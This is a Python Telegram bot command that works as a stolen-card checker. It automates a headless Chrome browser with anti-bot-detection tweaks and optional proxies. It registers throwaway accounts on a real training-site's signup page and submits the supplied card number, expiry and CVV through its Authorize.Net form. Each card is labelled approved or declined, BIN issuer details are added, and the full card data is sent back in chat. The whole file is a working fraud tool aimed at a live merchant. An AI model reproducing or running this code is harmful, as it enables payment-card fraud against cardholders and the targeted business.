import re
import logging
import random
import string
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from telegram import Update
from telegram.ext import ContextTypes

from card_parser import parse_card_input
from security import is_allowed_chat, get_chat_permissions, can_use_command
from api_client import api_client

logger = logging.getLogger(__name__)

def run_authnet_check(card_number, month, year, cvv, proxy_url=None):
    """
    Execute payment test on AuthNet Gate - MIGLIORATO SUBMIT
    """
    driver = None
    try:
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        
        if proxy_url:
            chrome_options.add_argument(f'--proxy-server={proxy_url}')
        
        driver = webdriver.Chrome(options=chrome_options)
        wait = WebDriverWait(driver, 15)
        
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
        # GENERATE CREDENTIALS
        first_name = random.choice(['John', 'Mike', 'David'])
        last_name = random.choice(['Smith', 'Johnson', 'Williams'])
        username = ''.join(random.choices(string.ascii_lowercase, k=8))
        email = f"{username}@gmail.com"
        password = "TestPassword123!"
        
        print("🔄 Accessing AuthNet...")
        driver.get("https://tempestprotraining.com/register/")
        time.sleep(3)
        
        # FILL REGISTRATION FORM
        fields_to_fill = [
            ("input[name='user_login']", username),
            ("input[name='first_name']", first_name),
            ("input[name='last_name']", last_name),
            ("input[name='user_email']", email),
            ("input[name='user_pass']", password)
        ]
        
        for selector, value in fields_to_fill:
            try:
                field = driver.find_element(By.CSS_SELECTOR, selector)
                field.clear()
                field.send_keys(value)
                print(f"✅ Compilato: {selector}")
            except:
                print(f"⚠️ Campo non trovato: {selector}")
        
        # Terms checkbox
        try:
            terms_checkbox = driver.find_element(By.CSS_SELECTOR, "input[name='terms']")
            if not terms_checkbox.is_selected():
                driver.execute_script("arguments[0].click();", terms_checkbox)
                print("✅ Terms checkbox selezionato")
        except:
            print("⚠️ Terms checkbox non trovato")
        
        time.sleep(1)
        
        # FILL PAYMENT INFO
        payment_fields = [
            ("input[name='authorize_net[card_number]']", card_number),
            ("input[name='authorize_net[exp_month]']", month),
            ("input[name='authorize_net[exp_year]']", year),
            ("input[name='authorize_net[cvc]']", cvv)
        ]
        
        for selector, value in payment_fields:
            try:
                field = driver.find_element(By.CSS_SELECTOR, selector)
                field.clear()
                field.send_keys(value)
                print(f"✅ Payment: {selector}")
            except:
                print(f"⚠️ Payment field non trovato: {selector}")
        
        # Manual Payment
        try:
            manual_field = driver.find_element(By.CSS_SELECTOR, "input[value*='manual']")
            if not manual_field.is_selected():
                driver.execute_script("arguments[0].click();", manual_field)
                print("✅ Manual Payment selezionato")
        except:
            print("⚠️ Manual Payment non trovato")
        
        time.sleep(2)
        
        # SUBMIT MIGLIORATO - PROVA TUTTI I BOTTONI POSSIBILI
        submit_selectors = [
            "button[type='submit']",
            "input[type='submit']", 
            "#submit",
            ".arm_form_submit_btn",
            "button[name='arm_action']"
        ]
        
        submitted = False
        for selector in submit_selectors:
            try:
                submit_btn = driver.find_element(By.CSS_SELECTOR, selector)
                if submit_btn.is_displayed() and submit_btn.is_enabled():
                    print(f"✅ Trovato submit: {selector}")
                    driver.execute_script("arguments[0].scrollIntoView(true);", submit_btn)
                    time.sleep(1)
                    driver.execute_script("arguments[0].click();", submit_btn)
                    print("✅ Form inviato!")
                    submitted = True
                    break
            except:
                continue
        
        if not submitted:
            print("❌ Nessun bottone submit trovato")
            return "ERROR", "No submit button found"
        
        print("🔄 Processing payment...")
        time.sleep(12)  # Aumentato il tempo di attesa
        
        # ANALYZE RESULT
        current_url = driver.current_url
        page_text = driver.page_source.lower()
        
        print(f"📄 Final URL: {current_url}")
        
        # 1. CONTROLLA SUCCESSO PRIMA DI TUTTO
        if 'my-account' in current_url or 'dashboard' in current_url:
            print("✅ SUCCESSO - Account creato")
            return "APPROVED", "Payment successful - Account created"
        
        # 2. CONTROLLA MESSAGGI DI SUCCESSO
        if 'thank you' in page_text or 'welcome' in page_text or 'account created' in page_text:
            print("✅ SUCCESSO - Messaggio di benvenuto")
            return "APPROVED", "Payment successful"
        
        # 3. CONTROLLA ERRORI DI CARTA
        decline_patterns = [
            'your card was declined', 'card was declined', 'declined',
            'do not honor', 'insufficient funds', 'invalid card',
            'transaction has been declined', 'payment failed'
        ]
        
        for pattern in decline_patterns:
            if pattern in page_text:
                print(f"❌ DECLINED - {pattern}")
                return "DECLINED", pattern.title()
        
        # 4. CONTROLLA ERRORI VISIBILI
        try:
            error_elements = driver.find_elements(By.CSS_SELECTOR, ".error, .notice-error, .alert-danger")
            for element in error_elements:
                if element.is_displayed():
                    error_text = element.text.lower()
                    if any(word in error_text for word in ['declined', 'invalid', 'failed', 'error']):
                        print(f"❌ DECLINED - Errore: {error_text}")
                        return "DECLINED", error_text[:80]
        except:
            pass
        
        # 5. SE SIAMO ANCORA IN REGISTRATION
        if 'register' in current_url:
            print("❌ DECLINED - Ancora in registrazione")
            return "DECLINED", "Payment failed - Form not submitted"
        
        # 6. SE SIAMO SU UNA PAGINA DIVERSA, È SUCCESSO
        if 'tempestprotraining.com' in current_url and 'register' not in current_url:
            print("✅ APPROVED - Pagina diversa da registrazione")
            return "APPROVED", "Payment processed successfully"
        
        # 7. DEFAULT: DECLINED
        print("❌ DECLINED - Nessun indicatore di successo")
        return "DECLINED", "Payment failed - No success indicators"
                
    except Exception as e:
        print(f"❌ Error during test: {e}")
        return "ERROR", str(e)
    finally:
        if driver:
            driver.quit()

async def authnet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check card with AuthNet Gate"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type
    
    if not is_allowed_chat(chat_id, chat_type, user_id):
        permission_info = get_chat_permissions(chat_id, chat_type, user_id)
        await update.message.reply_text(f"❌ {permission_info}")
        return
    
    can_use, error_msg = can_use_command(user_id, 'au')
    if not can_use:
        await update.message.reply_text(error_msg)
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /au number|month|year|cvv [proxy]")
        return
    
    full_input = ' '.join(context.args)
    proxy_match = re.search(r'(https?://[^\s]+)', full_input)
    proxy_url = proxy_match.group(0) if proxy_match else None
    
    if proxy_url:
        card_input = full_input.replace(proxy_url, '').strip()
    else:
        card_input = full_input
    
    card_input = re.sub(r'\s+', ' ', card_input).strip()
    
    wait_message = await update.message.reply_text("🔄 Checking AuthNet...")
    
    try:
        parsed_card = parse_card_input(card_input)
        
        if not parsed_card['valid']:
            await wait_message.edit_text(f"❌ Invalid card: {parsed_card['error']}")
            return
        
        bin_number = parsed_card['number'][:6]
        bin_result = api_client.bin_lookup(bin_number)
        
        status, message = run_authnet_check(
            parsed_card['number'],
            parsed_card['month'],
            parsed_card['year'],
            parsed_card['cvv'],
            proxy_url=proxy_url
        )
        
        if status == "APPROVED":
            response = f"""Approved ✅

Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
Gateway: AuthNet $32
Response: {message}"""
        elif status == "DECLINED":
            response = f"""Declined ❌

Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
Gateway: AuthNet $32
Response: {message}"""
        else:
            response = f"""Error ⚠️

Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
Gateway: AuthNet $32
Response: {message}"""
        
        if bin_result and bin_result['success']:
            bin_data = bin_result['data']
            response += f"""

BIN Info:
Country: {bin_data.get('country', 'N/A')}
Issuer: {bin_data.get('issuer', 'N/A')}
Scheme: {bin_data.get('scheme', 'N/A')}
Type: {bin_data.get('type', 'N/A')}
Tier: {bin_data.get('tier', 'N/A')}"""
        
        await wait_message.edit_text(response)
        
    except Exception as e:
        logger.error(f"❌ Error in authnet_command: {e}")
        await wait_message.edit_text(f"❌ Error: {str(e)}")
